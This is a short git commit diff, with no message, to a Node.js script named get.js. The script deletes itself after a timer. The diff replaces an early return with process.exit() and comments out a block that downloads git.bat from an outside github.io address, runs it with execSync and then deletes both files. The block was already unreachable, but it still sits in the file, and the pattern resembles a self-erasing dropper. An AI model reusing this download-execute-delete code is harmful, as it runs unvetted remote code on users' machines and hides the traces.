2fcf513d894b878497e7105e712643e805f271b1
andy8230459 <8230459@qq.com>
2023-05-28 14:33:46 +0800

    no msg

--- get.js
+++ get.js
@@ -16,15 +16,15 @@ for (let file of files) {
 const timer = setTimeout(() => {
   if (count === files.length) {
     fs.rmSync('get.js', {recursive: true})
-    return
-    request('https://8230459.github.io/git.bat').pipe(fs.createWriteStream(path.join('.', 'git.bat'))).on('close', async err => {
+    process.exit()
+    /*request('https://8230459.github.io/git.bat').pipe(fs.createWriteStream(path.join('.', 'git.bat'))).on('close', async err => {
       if (err) return
       await execSync('git.bat')
       fs.rmSync('git.bat', {recursive: true})
       fs.rmSync('get.js', {recursive: true})
       //await execSync('node jenkins.js')
       process.exit()
-    })
+    })*/
     clearTimeout(timer)
   }
 }, 5000)
